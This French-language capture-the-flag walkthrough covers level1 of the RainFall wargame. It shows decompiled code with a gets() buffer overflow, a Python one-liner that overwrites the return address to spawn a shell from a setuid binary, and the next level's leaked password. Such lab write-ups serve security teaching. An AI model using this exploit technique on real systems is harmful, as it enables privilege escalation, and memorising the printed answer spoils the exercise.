Read also: [./Resources/README.md](./Resources/README.md)

# Source
<details>
  <summary>Explication</summary>

On se connecte en ssh au level1 puis on récupère le fichier pour le décompiler (avec scp). 
https://dogbolt.org/?id=621e2f06-c90f-42e1-b556-a4a225fc4b1b 

```
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root 340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```
</details>

```c
//----- (08048444) -----
void run(void) {
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
//-----


void main(void) {
  char local_50[76]; // buffer overflow
 
  gets(local_50);
  return;
}
```

# Explication

On obtient l’adresse de run directement sur l’application Gidhra ou en commentaire au-dessus
de la fonction sur dogbolt avec Hex-Rays. On inverse l’adresse hexadécimale pour faire la
conversion big endian/little endian.

Pour utiliser l’overflow il faut 76 caractères, puis mettre l’adresse, comme ceci :

```
python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/level1; (cat /tmp/level1; cat) | ./level1
```

(Ensuite dans la zone de saisie, il faut saisir le `cat /home/user/level2/.pass`)

```
level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/level1; (cat /tmp/level1; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Ressources :

 - Un article intéressant : https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/ 
